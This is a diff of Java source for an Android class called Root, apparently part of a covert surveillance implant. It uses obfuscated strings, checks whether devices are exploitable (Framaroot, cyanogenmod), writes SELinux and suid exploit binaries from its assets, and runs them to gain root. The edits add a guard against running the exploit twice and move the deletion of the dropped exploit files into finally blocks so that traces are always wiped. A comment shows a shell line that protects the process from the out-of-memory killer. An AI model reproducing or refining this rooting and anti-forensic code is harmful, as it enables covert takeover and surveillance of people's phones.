@@ -194,13 +194,13 @@ public class Root {
 
 			return;
 		}
-		
-		if(oom_adjusted){
+
+		if (oom_adjusted) {
 			return;
 		}
 
 		oom_adjusted = true;
-		
+
 		int pid = android.os.Process.myPid();
 		// 32_34=#!/system/bin/sh
 		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
@@ -471,7 +471,8 @@ public class Root {
 		final PackageManager pm = Status.getAppContext().getPackageManager();
 
 		if (version.contains(M.e("cyanogenmod")) || version.contains(M.e("-CM-"))
-				|| pm.hasSystemFeature(M.e("com.cyanogenmod.account")) || pm.hasSystemFeature(M.e("com.cyanogenmod.updater"))) {
+				|| pm.hasSystemFeature(M.e("com.cyanogenmod.account"))
+				|| pm.hasSystemFeature(M.e("com.cyanogenmod.updater"))) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkFramarootExploitability) cyanogenmod");
 			}
@@ -760,7 +761,7 @@ public class Root {
 		} else {
 			Configuration.shellFile = Configuration.shellFileBase;
 		}
-		
+
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
 
@@ -1015,9 +1016,6 @@ public class Root {
 					Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
 				}
 
-				shellInstaller.delete();
-				selinuxSuidext.delete();
-
 				if (PackageInfo.checkRoot()) {
 					Status.setRoot(true);
 
@@ -1035,6 +1033,9 @@ public class Root {
 				}
 
 				return;
+			} finally {
+				shellInstaller.delete();
+				selinuxSuidext.delete();
 			}
 
 		}
@@ -1051,14 +1052,22 @@ public class Root {
 			final String selinuxSuidext = M.e("qj"); // selinux_suidext
 			final String suidext = M.e("ss"); // suidext (standard)
 
-			InputStream streamExpl = Utils.getAssetStream(M.e("g.bin")); // selinux_exploit
-			InputStream streamSelinuxSuidext = Utils.getAssetStream(M.e("j.bin")); // selinux_suidext
-																				// rilcap
-			InputStream streamSuidext = Utils.getAssetStream(M.e("s.bin")); // suidext
-																		// rilcapn
-																		// (standard)
+			AutoFile vs = new AutoFile(path, localExploit);
+			if (vs.exists()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (run) localexploit running?");
+				}
+				return;
+			}
 
 			try {
+				InputStream streamExpl = Utils.getAssetStream(M.e("g.bin")); // selinux_exploit
+				InputStream streamSelinuxSuidext = Utils.getAssetStream(M.e("j.bin")); // selinux_suidext
+																						// rilcap
+				InputStream streamSuidext = Utils.getAssetStream(M.e("s.bin")); // suidext
+				// rilcapn
+				// (standard)
+
 				Root.fileWrite(localExploit, streamExpl, Cfg.RNDDB);
 				Root.fileWrite(selinuxSuidext, streamSelinuxSuidext, Cfg.RNDDB);
 				Root.fileWrite(suidext, streamSuidext, Cfg.RNDDB);
@@ -1132,14 +1141,6 @@ public class Root {
 					PackageInfo.checkRoot();
 				}
 
-				File file = new File(Status.getAppContext().getFilesDir(), localExploit);
-				file.delete();
-
-				file = new File(Status.getAppContext().getFilesDir(), selinuxSuidext);
-				file.delete();
-
-				file = new File(Status.getAppContext().getFilesDir(), suidext);
-				file.delete();
 			} catch (final Exception e1) {
 				if (Cfg.EXCEPTION) {
 					Check.log(e1);
@@ -1151,6 +1152,15 @@ public class Root {
 				}
 
 				return;
+			} finally {
+				File file = new File(Status.getAppContext().getFilesDir(), localExploit);
+				file.delete();
+
+				file = new File(Status.getAppContext().getFilesDir(), selinuxSuidext);
+				file.delete();
+
+				file = new File(Status.getAppContext().getFilesDir(), suidext);
+				file.delete();
 			}
 		}
 	}
